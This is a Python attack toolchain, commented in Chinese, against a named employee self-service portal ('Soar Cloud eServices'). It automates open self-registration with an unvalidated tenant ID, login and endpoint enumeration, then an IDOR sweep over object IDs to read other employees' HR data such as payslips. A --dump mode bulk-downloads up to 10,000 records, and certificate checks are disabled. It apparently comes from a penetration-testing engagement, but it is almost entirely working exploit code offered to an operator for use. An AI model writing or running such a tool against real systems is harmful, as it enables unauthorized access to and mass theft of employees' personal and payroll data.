#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Soar Cloud eServices 员工自助门户 — 注册→登录→越权(IDOR) post-auth 利用工具链
(author-and-handoff). Operator runs with a real, attacker-owned mailbox.

链条:
  E-005 (已确认): /Identity/Account/Register 开放自助注册, 任意邮箱 + 未校验 CustomerID
        即创建持久账号 (ASP.NET Core Identity, <target>:9956 区域实例)。
  E-006: 登录疑受邮件确认门限制 → 用【自有真实邮箱】注册并点确认链接即可登录。
  本工具: 自动完成 register → (你手动点邮件确认) → login → 拿到认证会话 →
          枚举登录后端点 → 对带对象 ID 的端点做 IDOR 差分 (越权访问他人 HR 数据)。

子命令:
  register   注册一个账号 (自有邮箱)。也支持 CustomerID 差分 (--customerid-matrix)
             以确证 E-005 那条 0.5 "租户绑定是否被校验" 子结论。
  login      用账号登录, 把认证 cookie 存到 --jar 文件供后续复用。
  enum       带会话抓取登录后落地页, 列出含对象 ID 参数的端点 (IDOR 候选)。
  idor       对一个 URL 模板 (含 {id}) 做受控差分, 判定能否越权读到他人对象。
             默认证明级 (小范围 + 仅比对, 不落库); --dump 才全量 (操作者自担)。

默认证明即止 (proof-by-default): idor 默认只取小范围样本做存在性差分。
拖库式全量抽取请显式 --dump, 由操作者决定与执行。

依赖: Python 3.8+ (标准库)。
用法:
  python eservices_postauth.py register --base https://<target>:9956 \
      --email you@yourbox.tld --password 'Aa1!aaaa' --customerid SCS001
  # → 收邮件点确认链接
  python eservices_postauth.py login --base https://<target>:9956 \
      --email you@yourbox.tld --password 'Aa1!aaaa' --jar sess.txt
  python eservices_postauth.py enum --base https://<target>:9956 --jar sess.txt
  python eservices_postauth.py idor --base https://<target>:9956 --jar sess.txt \
      --template '/eService/PaySlip?empId={id}' --start 1000 --count 15
"""
import argparse
import http.cookiejar
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def opener_for(jar_path=None, proxy=None):
    cj = http.cookiejar.MozillaCookieJar()
    if jar_path:
        try:
            cj.load(jar_path, ignore_discard=True, ignore_expires=True)
        except Exception:
            pass
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers = [urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    op = urllib.request.build_opener(*handlers)
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op, cj


def get(op, url):
    with op.open(url, timeout=30) as r:
        return r.status, r.read().decode("utf-8", "replace"), str(r.geturl())


def post(op, url, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with op.open(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace"), str(r.geturl())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), url


def af_token(html):
    m = re.search(r'name="__RequestVerificationToken"[^>]*\bvalue="([^"]+)"', html)
    return m.group(1) if m else ""


def do_register(op, base, email, name, password, customerid):
    url = base + "/Identity/Account/Register"
    _, html, _ = get(op, url)            # sets antiforgery cookie in jar
    tok = af_token(html)
    data = {"__RequestVerificationToken": tok, "Input.Email": email, "Input.Name": name,
            "Input.PhoneNumber": "", "Input.Password": password,
            "Input.ConfirmPassword": password, "Input.CustomerID": customerid}
    st, body, _ = post(op, url, data)
    taken = "already taken" in body
    err = re.findall(r'<li>([^<]+)</li>', body)
    print("[register] email=%s customerid=%r -> status=%s%s" %
          (email, customerid, st, ("  ALREADY-EXISTS" if taken else "")))
    if err:
        print("           errors: " + "; ".join(e.strip() for e in err[:5]))
    elif not taken:
        print("           submitted (no errors) → check the mailbox for a confirmation link.")
    return taken, body


def cmd_register(args):
    op, _ = opener_for(proxy=args.proxy)
    if args.customerid_matrix:
        # E-005 0.5 子结论确证: 同口令、仅 CustomerID 变化, 看注册时是否对 CustomerID 校验。
        # (绑定差异需登录后另测; 这里先看注册层是否区别对待。)
        import time
        for cid in ["", "SCS001", "ZZINVALIDZZ"]:
            e = "matrix_%d_%s@%s" % (int(time.time()), (cid or "empty"), args.maildomain)
            do_register(op, args.base, e, "qa", args.password, cid)
            time.sleep(1)
        print("[i] 三者均成功且无 CustomerID 报错 → 注册层不校验租户码 (E-012); "
              "登录后用 enum/idor 看不同 CustomerID 账号的可见数据范围是否不同 → 才能定租户绑定。")
        return
    do_register(op, args.base, args.email, args.name, args.password, args.customerid)


def cmd_login(args):
    op, cj = opener_for(args.jar, args.proxy)
    url = args.base + "/Identity/Account/Login"
    _, html, _ = get(op, url)
    tok = af_token(html)
    data = {"__RequestVerificationToken": tok, "Input.Email": args.email,
            "Input.Password": args.password, "Input.RememberMe": "false"}
    st, body, final = post(op, url, data)
    authed = any(c.name.startswith(".AspNetCore.Identity.Application") for c in cj)
    if authed:
        cj.save(args.jar, ignore_discard=True, ignore_expires=True)
        print("[login] OK — auth cookie saved to %s ; landed on %s" % (args.jar, final))
    else:
        msg = re.search(r'lblMessage[^>]*>([^<]*)|<li>([^<]*)</li>', body)
        print("[login] FAILED (no auth cookie). %s" % (msg.group(0) if msg else ""))
        print("        若是邮件确认门: 先点注册确认邮件里的链接, 再重试。")


def cmd_enum(args):
    op, _ = opener_for(args.jar, args.proxy)
    st, html, final = get(op, args.base + "/")
    print("[enum] landing=%s status=%s len=%d" % (final, st, len(html)))
    links = sorted(set(re.findall(r'href="([^"#]+)"', html)))
    app = [l for l in links if not l.startswith(("http", "//", "mailto", "javascript"))]
    print("[enum] %d in-app links. Candidates with object-id params:" % len(app))
    idish = [l for l in app if re.search(r'(\?|&)(id|empid|userid|no|seq|sn|key|emp|pid)=', l, re.I)]
    for l in (idish or app)[:60]:
        print("   ", l)
    if not idish:
        print("   (no obvious id params on the landing — log a deeper page and re-run, "
              "or feed a known endpoint to `idor --template`.)")


def cmd_idor(args):
    op, _ = opener_for(args.jar, args.proxy)
    base_len = None
    hits = []
    rng = range(args.start, args.start + (10000 if args.dump else args.count))
    print("[idor] template=%s range=%s..%s%s" %
          (args.template, args.start, rng.stop - 1, "  (DUMP MODE)" if args.dump else ""))
    for i in rng:
        url = args.base + args.template.format(id=i)
        try:
            st, body, final = get(op, url)
        except Exception as e:
            print("   id=%-6s ERR %s" % (i, e)); continue
        login_redir = "Account/Login" in final or "login" in final.lower()
        L = len(body)
        if base_len is None and not login_redir:
            base_len = L
        flag = ""
        if login_redir:
            flag = "redir→login (session lost / not authorized)"
        elif st == 200 and L > 200 and not re.search(r'(無權|無此資料|not.*author|access denied|錯誤訊息)', body):
            flag = "DATA(%d)" % L
            hits.append((i, L))
        print("   id=%-6s status=%s len=%-6s %s" % (i, st, L, flag))
        if args.dump and flag.startswith("DATA"):
            open("idor_%s.html" % i, "w", encoding="utf-8").write(body)
    print("[idor] %d object(s) returned data across the id range." % len(hits))
    if len(hits) > 1:
        print("[+] 多个不同 id 都返回数据 → 横向越权 (IDOR) 确认: 可读他人对象。"
              " 证明即止: 已证存在; 全量抽取(拖库)请操作者用 --dump 自行决定与执行。")


def main():
    ap = argparse.ArgumentParser(description="Soar Cloud eServices post-auth toolkit (author-and-handoff)")
    ap.add_argument("--proxy")
    sub = ap.add_subparsers(dest="cmd", required=True)

    r = sub.add_parser("register"); r.set_defaults(func=cmd_register)
    r.add_argument("--base", required=True); r.add_argument("--email", default="")
    r.add_argument("--name", default="qa"); r.add_argument("--password", required=True)
    r.add_argument("--customerid", default="")
    r.add_argument("--customerid-matrix", action="store_true", help="E-005 confirm: empty/SCS001/bogus")
    r.add_argument("--maildomain", default="example.org")

    lg = sub.add_parser("login"); lg.set_defaults(func=cmd_login)
    lg.add_argument("--base", required=True); lg.add_argument("--email", required=True)
    lg.add_argument("--password", required=True); lg.add_argument("--jar", default="sess.txt")

    en = sub.add_parser("enum"); en.set_defaults(func=cmd_enum)
    en.add_argument("--base", required=True); en.add_argument("--jar", default="sess.txt")

    io = sub.add_parser("idor"); io.set_defaults(func=cmd_idor)
    io.add_argument("--base", required=True); io.add_argument("--jar", default="sess.txt")
    io.add_argument("--template", required=True, help="path with {id}, e.g. /eService/PaySlip?empId={id}")
    io.add_argument("--start", type=int, default=1); io.add_argument("--count", type=int, default=15)
    io.add_argument("--dump", action="store_true", help="full extraction (operator decision; proof-only by default)")

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
